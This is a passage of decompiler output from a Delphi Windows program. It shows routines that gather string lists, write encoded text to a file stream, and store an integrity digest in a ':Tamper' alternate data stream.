  return (*(int (__fastcall **)(_DWORD, _DWORD, int *, void *))(**(_DWORD **)(v8 + 20) + 16))(
           *(_DWORD *)(v8 + 20),
           **(_DWORD **)(v8 + 20),
           v7,
           &loc_440188);
}
// 44012E: variable 'v4' is possibly undefined
// 43FED0: using guessed type _DWORD __cdecl sub_43FED0(_DWORD);

//----- (00440190) --------------------------------------------------------
int __usercall sub_440190@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v3; // ebx
  Idthreadcomponent::TIdThreadComponent *v4; // ebx
  unsigned int v6[2]; // [esp-2Ch] [ebp-48h] BYREF
  int *v7; // [esp-24h] [ebp-40h]
  _DWORD v8[3]; // [esp-20h] [ebp-3Ch] BYREF
  _DWORD v9[2]; // [esp-14h] [ebp-30h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // [esp-8h] [ebp-24h] BYREF
  int *v12; // [esp-4h] [ebp-20h]
  int *v13; // [esp+0h] [ebp-1Ch]
  int v14; // [esp+4h] [ebp-18h]
  int System__AnsiString; // [esp+8h] [ebp-14h]
  int v16; // [esp+Ch] [ebp-10h]
  int v17; // [esp+10h] [ebp-Ch]
  __int32 v18; // [esp+14h] [ebp-8h] BYREF
  __int32 v19; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v19 = 0;
  v18 = 0;
  v16 = a2;
  v17 = a1;
  v12 = &savedregs;
  v11 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_440308;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD, _DWORD, _DWORD, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(a1 + 20)
                                                                                                  + 12))(
    *(_DWORD *)(a1 + 20),
    **(_DWORD **)(a1 + 20),
    0,
    &loc_440308,
    ExceptionList);
  v13 = &savedregs;
  v12 = (int *)&loc_4402E6;
  v11 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v11);
  if ( *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v17 + 4) + 4) + 8) - 1 >= 0 )
  {
    v14 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v17 + 4) + 4) + 8);
    System__AnsiString = 0;
    do
    {
      ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
      v9[1] = &loc_4402BA;
      v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v9);
      v3 = *(_DWORD *)(v17 + 4);
      sub_406C44(&v18);
      v8[2] = &savedregs;
      v8[1] = &loc_440290;
      v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v8);
      v7 = &savedregs;
      v6[1] = (unsigned int)&loc_440273;
      v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v6);
      v4 = *(Idthreadcomponent::TIdThreadComponent **)(v3 + 4);
      sub_406C44(&v18);
      if ( *((_DWORD *)v4 + 2) <= (unsigned int)System__AnsiString )
        Idthreadcomponent::TIdThreadComponent::SetThreadName(v4, System__AnsiString);
      sub_407030(&v18, *(_DWORD *)(*((_DWORD *)v4 + 1) + 8 * System__AnsiString));
      sub_407030(&v19, v18);
      __writefsdword(0, v6[0]);
      v7 = (int *)&loc_44027A;
      sub_406C44(&v18);
      __writefsdword(0, (unsigned int)v11);
      v13 = (int *)&loc_440297;
      sub_406C44(&v18);
      sub_429140(v16, v19, 0, a3);
      __writefsdword(0, (unsigned int)v11);
      v13 = (int *)&loc_4402C1;
      sub_406C44(&v19);
      ++System__AnsiString;
      --v14;
    }
    while ( v14 );
  }
  __writefsdword(0, (unsigned int)v11);
  (*(void (__fastcall **)(_DWORD, _DWORD, int *, int, int, int, int, void *))(**(_DWORD **)(v17 + 20) + 16))(
    *(_DWORD *)(v17 + 20),
    **(_DWORD **)(v17 + 20),
    v13,
    v17,
    v16,
    System__AnsiString,
    v14,
    &loc_4402ED);
  __writefsdword(0, (unsigned int)v11);
  v13 = (int *)&loc_44030F;
  return sub_406CA4((int)&v18, 2);
}

//----- (00440320) --------------------------------------------------------
int __usercall sub_440320@<eax>(char a1@<al>, int a2@<edi>, int a3)
{
  int v4; // ebx
  Idthreadcomponent::TIdThreadComponent *v5; // ebx
  unsigned int v7[2]; // [esp-2Ch] [ebp-4Ch] BYREF
  int *v8; // [esp-24h] [ebp-44h]
  _DWORD v9[3]; // [esp-20h] [ebp-40h] BYREF
  _DWORD v10[2]; // [esp-14h] [ebp-34h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v12; // [esp-8h] [ebp-28h]
  int *v13; // [esp-4h] [ebp-24h]
  void *v14; // [esp+0h] [ebp-20h]
  int v15; // [esp+4h] [ebp-1Ch]
  int v16; // [esp+8h] [ebp-18h]
  int v17; // [esp+Ch] [ebp-14h]
  int System__AnsiString; // [esp+10h] [ebp-10h]
  __int32 v19; // [esp+14h] [ebp-Ch] BYREF
  __int32 v20; // [esp+18h] [ebp-8h] BYREF
  __int32 v21; // [esp+1Ch] [ebp-4h] BYREF
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v21 = 0;
  v20 = 0;
  v19 = 0;
  v13 = &savedregs;
  v12 = &loc_4404D1;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a3 - 4) + 4))(*(_DWORD *)(a3 - 4), **(_DWORD **)(a3 - 4));
  System__AnsiString = sub_43EAE0(*(_DWORD *)(*(_DWORD *)(a3 - 8) + 4), *(_DWORD *)(a3 - 12), a1);
  if ( System__AnsiString >= 0 )
  {
    v4 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a3 - 8) + 4) + 4);
    if ( *(_DWORD *)(v4 + 8) <= (unsigned int)System__AnsiString )
      Idthreadcomponent::TIdThreadComponent::SetThreadName(
        *(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(*(_DWORD *)(a3 - 8) + 4) + 4),
        System__AnsiString);
    v16 = *(_DWORD *)(*(_DWORD *)(v4 + 4) + 8 * System__AnsiString + 4);
    if ( *(_DWORD *)(*(_DWORD *)(v16 + 4) + 8) - 1 >= 0 )
    {
      v15 = *(_DWORD *)(*(_DWORD *)(v16 + 4) + 8);
      v17 = 0;
      do
      {
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
        v10[1] = &loc_440481;
        v10[0] = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v10);
        sub_406C44(&v19);
        v9[2] = &savedregs;
        v9[1] = &loc_440459;
        v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v9);
        v8 = &savedregs;
        v7[1] = (unsigned int)&loc_44043C;
        v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v7);
        v5 = *(Idthreadcomponent::TIdThreadComponent **)(v16 + 4);
        sub_406C44(&v19);
        if ( *((_DWORD *)v5 + 2) <= (unsigned int)v17 )
          Idthreadcomponent::TIdThreadComponent::SetThreadName(v5, v17);
        sub_407030(&v19, *(_DWORD *)(*((_DWORD *)v5 + 1) + 8 * v17));
        sub_407030(&v20, v19);
        __writefsdword(0, v7[0]);
        v8 = (int *)&loc_440443;
        sub_406C44(&v19);
        __writefsdword(0, (unsigned int)v12);
        v14 = &loc_440460;
        sub_406C44(&v19);
        sub_407030(&v21, v20);
        __writefsdword(0, (unsigned int)v12);
        v14 = &loc_440488;
        sub_406C44(&v20);
        if ( !(*(unsigned __int8 (__fastcall **)(_DWORD, __int32))(**(_DWORD **)(a3 - 8) + 4))(*(_DWORD *)(a3 - 8), v21) )
          sub_429140(*(_DWORD *)(a3 - 4), v21, 0, a2);
        ++v17;
        --v15;
      }
      while ( v15 );
    }
  }
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_4404D8;
  sub_406CA4((int)&v19, 3);
  return System__AnsiString;
}

//----- (004404E0) --------------------------------------------------------
int __usercall sub_4404E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int v5; // [esp-Ch] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-8h] [ebp-14h] BYREF
  void *v7; // [esp-4h] [ebp-10h]
  int *v8; // [esp+0h] [ebp-Ch]
  int v9; // [esp+4h] [ebp-8h]
  int v10; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = a3;
  v8 = (int *)a2;
  v9 = a1;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 20) + 12))(*(_DWORD *)(a1 + 20), **(_DWORD **)(a1 + 20));
  v8 = &savedregs;
  v7 = &loc_440571;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( sub_440320(1, a4, (int)&savedregs) == -2 )
  {
    (*(void (__fastcall **)(_DWORD, _DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(v9 + 20) + 20))(
      *(_DWORD *)(v9 + 20),
      **(_DWORD **)(v9 + 20),
      v5,
      ExceptionList);
    v8 = &savedregs;
    v7 = &loc_440551;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_440320(0, a4, (int)&savedregs);
    __writefsdword(0, (unsigned int)ExceptionList);
    (*(void (__fastcall **)(_DWORD, _DWORD, int *, void *))(**(_DWORD **)(v9 + 20) + 24))(
      *(_DWORD *)(v9 + 20),
      **(_DWORD **)(v9 + 20),
      v8,
      &loc_440558);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  return (*(int (__fastcall **)(_DWORD, _DWORD, int *, void *))(**(_DWORD **)(v9 + 20) + 16))(
           *(_DWORD *)(v9 + 20),
           **(_DWORD **)(v9 + 20),
           v8,
           &loc_440578);
}
// 44051E: variable 'v5' is possibly undefined

//----- (00440580) --------------------------------------------------------
int __usercall sub_440580@<eax>(char a1@<al>, int a2@<edi>, int a3)
{
  int v4; // ebx
  Idthreadcomponent::TIdThreadComponent *v5; // ebx
  int v6; // ebx
  unsigned int v7; // eax
  unsigned int v9[2]; // [esp-2Ch] [ebp-54h] BYREF
  int *v10; // [esp-24h] [ebp-4Ch]
  _DWORD v11[3]; // [esp-20h] [ebp-48h] BYREF
  _DWORD v12[2]; // [esp-14h] [ebp-3Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-34h] BYREF
  void *v14; // [esp-8h] [ebp-30h]
  int *v15; // [esp-4h] [ebp-2Ch]
  void *v16; // [esp+0h] [ebp-28h]
  int v17; // [esp+4h] [ebp-24h]
  int v18; // [esp+8h] [ebp-20h] BYREF
  int v19; // [esp+Ch] [ebp-1Ch]
  int v20; // [esp+10h] [ebp-18h]
  int v21; // [esp+14h] [ebp-14h]
  int System__AnsiString; // [esp+18h] [ebp-10h]
  __int32 v23; // [esp+1Ch] [ebp-Ch] BYREF
  __int32 v24; // [esp+20h] [ebp-8h] BYREF
  __int32 v25; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v18 = 0;
  v25 = 0;
  v24 = 0;
  v23 = 0;
  v15 = &savedregs;
  v14 = &loc_44076A;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a3 - 4) + 4))(*(_DWORD *)(a3 - 4), **(_DWORD **)(a3 - 4));
  System__AnsiString = sub_43EAE0(*(_DWORD *)(*(_DWORD *)(a3 - 8) + 4), *(_DWORD *)(a3 - 12), a1);
  if ( System__AnsiString >= 0 )
  {
    v4 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a3 - 8) + 4) + 4);
    if ( *(_DWORD *)(v4 + 8) <= (unsigned int)System__AnsiString )
      Idthreadcomponent::TIdThreadComponent::SetThreadName(
        *(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(*(_DWORD *)(a3 - 8) + 4) + 4),
        System__AnsiString);
    v20 = *(_DWORD *)(*(_DWORD *)(v4 + 4) + 8 * System__AnsiString + 4);
    if ( *(_DWORD *)(*(_DWORD *)(v20 + 4) + 8) - 1 >= 0 )
    {
      v19 = *(_DWORD *)(*(_DWORD *)(v20 + 4) + 8);
      v21 = 0;
      do
      {
        ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
        v12[1] = &loc_4406E4;
        v12[0] = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v12);
        sub_406C44(&v23);
        v11[2] = &savedregs;
        v11[1] = &loc_4406BC;
        v11[0] = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v11);
        v10 = &savedregs;
        v9[1] = (unsigned int)&loc_44069F;
        v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v9);
        v5 = *(Idthreadcomponent::TIdThreadComponent **)(v20 + 4);
        sub_406C44(&v23);
        if ( *((_DWORD *)v5 + 2) <= (unsigned int)v21 )
          Idthreadcomponent::TIdThreadComponent::SetThreadName(v5, v21);
        sub_407030(&v23, *(_DWORD *)(*((_DWORD *)v5 + 1) + 8 * v21));
        sub_407030(&v24, v23);
        __writefsdword(0, v9[0]);
        v10 = (int *)&loc_4406A6;
        sub_406C44(&v23);
        __writefsdword(0, (unsigned int)v14);
        v16 = &loc_4406C3;
        sub_406C44(&v23);
        sub_407030(&v25, v24);
        __writefsdword(0, (unsigned int)v14);
        v16 = &loc_4406EB;
        sub_406C44(&v24);
        if ( !(*(unsigned __int8 (__fastcall **)(_DWORD, __int32))(**(_DWORD **)(a3 - 8) + 4))(*(_DWORD *)(a3 - 8), v25) )
        {
          v6 = *(_DWORD *)(a3 - 4);
          ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&v18;
          v7 = sub_407B7C((int)sub_440788, v25, 1);
          sub_407AD8(v25, v7 + 1, 0x7FFFFFFF, ExceptionList);
          v17 = v18;
          sub_429140(v6, v18, 0, a2);
        }
        ++v21;
        --v19;
      }
      while ( v19 );
    }
  }
  __writefsdword(0, (unsigned int)v14);
  v16 = &loc_440771;
  sub_406C44(&v18);
  sub_406CA4((int)&v23, 3);
  return System__AnsiString;
}
// 440788: using guessed type int sub_440788();

//----- (00440790) --------------------------------------------------------
int __usercall sub_440790@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int v5; // [esp-Ch] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-8h] [ebp-14h] BYREF
  void *v7; // [esp-4h] [ebp-10h]
  int *v8; // [esp+0h] [ebp-Ch]
  int v9; // [esp+4h] [ebp-8h]
  int v10; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = a3;
  v8 = (int *)a2;
  v9 = a1;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 20) + 12))(*(_DWORD *)(a1 + 20), **(_DWORD **)(a1 + 20));
  v8 = &savedregs;
  v7 = &loc_440821;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( sub_440580(1, a4, (int)&savedregs) == -2 )
  {
    (*(void (__fastcall **)(_DWORD, _DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(v9 + 20) + 20))(
      *(_DWORD *)(v9 + 20),
      **(_DWORD **)(v9 + 20),
      v5,
      ExceptionList);
    v8 = &savedregs;
    v7 = &loc_440801;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_440580(0, a4, (int)&savedregs);
    __writefsdword(0, (unsigned int)ExceptionList);
    (*(void (__fastcall **)(_DWORD, _DWORD, int *, void *))(**(_DWORD **)(v9 + 20) + 24))(
      *(_DWORD *)(v9 + 20),
      **(_DWORD **)(v9 + 20),
      v8,
      &loc_440808);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  return (*(int (__fastcall **)(_DWORD, _DWORD, int *, void *))(**(_DWORD **)(v9 + 20) + 16))(
           *(_DWORD *)(v9 + 20),
           **(_DWORD **)(v9 + 20),
           v8,
           &loc_440828);
}
// 4407CE: variable 'v5' is possibly undefined

//----- (00440830) --------------------------------------------------------
volatile __int32 *__fastcall sub_440830(
        int (__fastcall ***a1)(_DWORD, int, int, volatile __int32 *),
        int a2,
        int a3,
        int a4,
        volatile __int32 *a5)
{
  volatile __int32 *result; // eax

  result = (volatile __int32 *)(**a1)(a1, a2, a3, a5);
  if ( !(_BYTE)result )
    return sub_406FE8(a5, a4);
  return result;
}

//----- (00440870) --------------------------------------------------------
_DWORD *__usercall sub_440870@<eax>(int a1@<eax>, const void *a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  unsigned __int8 v4; // al
  bool v5; // cf
  char v6; // al
  WCHAR *v7; // eax
  WCHAR *v8; // eax
  int v9; // edx
  WCHAR *v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // edx
  int v14; // eax
  int v15; // edx
  int v16; // eax
  int v17; // edx
  int v18; // eax
  __int64 v19; // rax
  _WORD *v20; // edx
  int v21; // eax
  int v22; // edx
  int v23; // eax
  int v24; // edx
  int v25; // eax
  int v26; // edx
  int v27; // eax
  __int64 v29; // [esp-44h] [ebp-90h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v30; // [esp-3Ch] [ebp-88h] BYREF
  void *v31; // [esp-38h] [ebp-84h]
  int *v32; // [esp-34h] [ebp-80h]
  struct _EXCEPTION_REGISTRATION_RECORD *v33; // [esp-30h] [ebp-7Ch] BYREF
  void *v34; // [esp-2Ch] [ebp-78h]
  int *v35; // [esp-28h] [ebp-74h]
  struct _EXCEPTION_REGISTRATION_RECORD *v36; // [esp-24h] [ebp-70h] BYREF
  void *v37; // [esp-20h] [ebp-6Ch]
  int *v38; // [esp-1Ch] [ebp-68h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-64h] BYREF
  void *v40; // [esp-14h] [ebp-60h]
  int *v41; // [esp-10h] [ebp-5Ch]
  unsigned int v42[2]; // [esp-Ch] [ebp-58h] BYREF
  int *v43; // [esp-4h] [ebp-50h]
  int v44; // [esp+Ch] [ebp-40h] BYREF
  char v45[16]; // [esp+10h] [ebp-3Ch] BYREF
  _DWORD *v46; // [esp+20h] [ebp-2Ch]
  Classes::TStream *v47; // [esp+24h] [ebp-28h]
  int v48; // [esp+28h] [ebp-24h]
  __int64 v49; // [esp+2Ch] [ebp-20h]
  __int64 v50; // [esp+34h] [ebp-18h]
  _DWORD *v51; // [esp+3Ch] [ebp-10h]
  int v52; // [esp+40h] [ebp-Ch]
  WCHAR *v53; // [esp+44h] [ebp-8h] BYREF
  int v54; // [esp+48h] [ebp-4h] BYREF
  int savedregs; // [esp+4Ch] [ebp+0h] BYREF

  v44 = 0;
  v54 = 0;
  v53 = 0;
  v52 = a1;
  v43 = &savedregs;
  v42[1] = (unsigned int)&loc_440D0D;
  v42[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v42);
  (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(a1 + 20) + 20))(*(_DWORD *)(a1 + 20));
  v41 = &savedregs;
  v40 = &loc_440CE0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !*(_DWORD *)(v52 + 12) || *(_BYTE *)(v52 + 10) )
  {
    System::__linkproc__ TryFinallyExit(ExceptionList, v40, v41);
  }
  else
  {
    v51 = (_DWORD *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
    v38 = &savedregs;
    v37 = &loc_440CC0;
    v36 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v36);
    sub_43F3E0(v52, (int)v51, a3);
    sub_4289A0((int)v51, (int)&v53);
    sub_406C68(&v54);
    v4 = *(_BYTE *)(v52 + 16);
    v5 = v4 < 2u;
    v6 = v4 - 2;
    if ( v5 )
    {
      sub_407634((CHAR **)&v54, v53, 0, (unsigned __int16)v36);
    }
    else if ( v6 )
    {
      if ( v6 == 1 )
      {
        sub_4075BC(&v54, 3, 0);
        *(_BYTE *)v54 = -17;
        *(_BYTE *)(v54 + 1) = -69;
        *(_BYTE *)(v54 + 2) = -65;
        sub_40B238((BOOL *)v53, &v54);
      }
    }
    else
    {
      v7 = v53;
      if ( v53 )
        v7 = (WCHAR *)*((_DWORD *)v53 - 1);
      sub_4075BC(&v54, 2 * (_DWORD)v7 + 2, 0);
      *(_BYTE *)v54 = -1;
      *(_BYTE *)(v54 + 1) = -2;
      v8 = v53;
      if ( v53 )
        v8 = (WCHAR *)*((_DWORD *)v53 - 1);
      if ( (int)v8 > 0 )
      {
        a2 = (const void *)sub_4071C0((volatile __int32 *)&v53);
        v9 = sub_4071C8(&v54);
        v10 = v53;
        if ( v53 )
          v10 = (WCHAR *)*((_DWORD *)v53 - 1);
        System::Move(a2, (void *)(v9 + 2), 2 * (_DWORD)v10);
      }
    }
    v47 = (Classes::TStream *)sub_425590(*(_DWORD *)(v52 + 12), 4);
    if ( v47 )
    {
      v35 = &savedregs;
      v34 = &loc_440CA3;
      v33 = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&v33);
      if ( *(_BYTE *)(v52 + 17) )
      {
        v11 = *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 28);
        if ( !v11 )
        {
          v32 = (int *)(Sysinit::__linkproc__ GetTls() + 28);
          *v32 = sub_4389D0((int)a2, a3, a4);
          v11 = *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 28);
        }
        v48 = v11;
      }
      else
      {
        v48 = 0;
      }
      if ( v48 )
        (**(void (__fastcall ***)(int))v48)(v48);
      v12 = v54;
      if ( v54 )
        v12 = *(_DWORD *)(v54 - 4);
      if ( v12 <= 0 )
        goto LABEL_40;
      if ( v48 )
      {
        v13 = sub_4071C8(&v54);
        v14 = v54;
        if ( v54 )
          v14 = *(_DWORD *)(v54 - 4);
        (*(void (__fastcall **)(int, int, int, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v48 + 4))(
          v48,
          v13,
          v14,
          v35,
          v34,
          v33);
      }
      v15 = sub_4071C8(&v54);
      v16 = v54;
      if ( v54 )
        v16 = *(_DWORD *)(v54 - 4);
      v17 = (*(int (__fastcall **)(Classes::TStream *, int, int))(*(_DWORD *)v47 + 16))(v47, v15, v16);
      v18 = v54;
      if ( v54 )
        v18 = *(_DWORD *)(v54 - 4);
      if ( v18 == v17 )
      {
LABEL_40:
        v50 = sub_427470(v47);
        v32 = &savedregs;
        v31 = &loc_440B07;
        v30 = NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)&v30);
        v29 = v50;
        (*(void (__fastcall **)(Classes::TStream *))(*(_DWORD *)v47 + 4))(v47);
        __writefsdword(0, v29);
        v19 = ((__int64 (__fastcall *)(Classes::TStream *))**(_DWORD **)v47)(v47);
        v49 = v19 - v50;
        if ( v19 - v50 <= 0 )
          goto LABEL_53;
        sub_4075BC(&v54, v49, 0);
        v20 = (_WORD *)sub_4071C8(&v54);
        v21 = v54;
        if ( v54 )
          v21 = *(_DWORD *)(v54 - 4);
        sub_4051B8(v20, v21, 0);
        if ( v48 )
        {
          v22 = sub_4071C8(&v54);
          v23 = v54;
          if ( v54 )
            v23 = *(_DWORD *)(v54 - 4);
          (*(void (__fastcall **)(int, int, int))(*(_DWORD *)v48 + 4))(v48, v22, v23);
        }
        Classes::TStream::SetPosition(v47, v50);
        v24 = sub_4071C8(&v54);
        v25 = v54;
        if ( v54 )
          v25 = *(_DWORD *)(v54 - 4);
        v26 = (*(int (__fastcall **)(Classes::TStream *, int, int))(*(_DWORD *)v47 + 16))(v47, v24, v25);
        v27 = v54;
        if ( v54 )
          v27 = *(_DWORD *)(v54 - 4);
        if ( v27 == v26 )
        {
LABEL_53:
          *(_BYTE *)(v52 + 8) = 0;
          if ( v48 )
          {
            (*(void (__fastcall **)(int, char *))(*(_DWORD *)v48 + 24))(v48, v45);
            sub_407968(&v44, *(_DWORD **)(v52 + 12), L":Tamper");
            v46 = (_DWORD *)sub_425590(v44, 4);
            if ( v46 )
            {
              v30 = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
              HIDWORD(v29) = &loc_440C86;
              LODWORD(v29) = NtCurrentTeb()->NtTib.ExceptionList;
              __writefsdword(0, (unsigned int)&v29);
              (*(void (__fastcall **)(_DWORD *, char *, int))(*v46 + 16))(v46, v45, 16);
              __writefsdword(0, v29);
              v30 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_440C8D;
              sub_405598(v46);
            }
          }
          __writefsdword(0, (unsigned int)v31);
          v33 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_440CAA;
          sub_405598(v47);
          __writefsdword(0, (unsigned int)v34);
          v36 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_440CC7;
          sub_405598(v51);
          __writefsdword(0, (unsigned int)v37);
          ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_440CE7;
          (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(v52 + 20) + 24))(*(_DWORD *)(v52 + 20));
        }
        else
        {
          System::__linkproc__ TryFinallyExit(v31, v32, v33);
          System::__linkproc__ TryFinallyExit(v34, v35, v36);
          System::__linkproc__ TryFinallyExit(v37, v38, ExceptionList);
        }
      }
      else
      {
        System::__linkproc__ TryFinallyExit(v33, v34, v35);
        System::__linkproc__ TryFinallyExit(v36, v37, v38);
        System::__linkproc__ TryFinallyExit(ExceptionList, v40, v41);
      }
    }
    else
    {
      System::__linkproc__ TryFinallyExit(v36, v37, v38);
      System::__linkproc__ TryFinallyExit(ExceptionList, v40, v41);
    }
  }
  __writefsdword(0, v42[0]);
  v43 = (int *)&loc_440D14;
  sub_406C44(&v44);
  sub_406C44(&v53);
  return sub_406C68(&v54);
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 440D28: using guessed type wchar_t aTamper_0[8];

//----- (00440D40) --------------------------------------------------------
int __fastcall sub_440D40(int a1, int a2, int a3)
{
  unsigned int v5[2]; // [esp-8h] [ebp-18h] BYREF
  int *v6; // [esp+0h] [ebp-10h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+4h] [ebp-Ch] BYREF
  void *v8; // [esp+8h] [ebp-8h]
  int *v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = (int *)a1;
  (*(void (__fastcall **)(_DWORD, _DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *, int *))(**(_DWORD **)(a1 + 20)
                                                                                              + 12))(
    *(_DWORD *)(a1 + 20),
    **(_DWORD **)(a1 + 20),
    a3,
    ExceptionList,
    v6);
  v9 = &savedregs;
  v8 = &loc_440DD0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_440DB0;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  (*(void (__fastcall **)(int *, int, struct _EXCEPTION_REGISTRATION_RECORD *))(*v9 + 16))(v9, a2, ExceptionList);
  HIBYTE(v8) = (int)ExceptionList[1].Next > 0;
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_440DB7;
  sub_405598(ExceptionList);
  __writefsdword(0, v5[0]);
  (*(void (__fastcall **)(int, _DWORD, int *, struct _EXCEPTION_REGISTRATION_RECORD *, void *))(*(_DWORD *)v9[5] + 16))(
    v9[5],
    *(_DWORD *)v9[5],
    v6,
    ExceptionList,
    &loc_440DD7);
  return HIBYTE(v8);
}
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();

//----- (00440DE0) --------------------------------------------------------
int __fastcall sub_440DE0(int a1, char a2)
{
  int v3; // ecx
  unsigned int v5[2]; // [esp-8h] [ebp-10h] BYREF
  int *v6; // [esp+0h] [ebp-8h]
  int v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v7 = a1;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 20) + 20))(*(_DWORD *)(a1 + 20), **(_DWORD **)(a1 + 20));
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_440E22;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
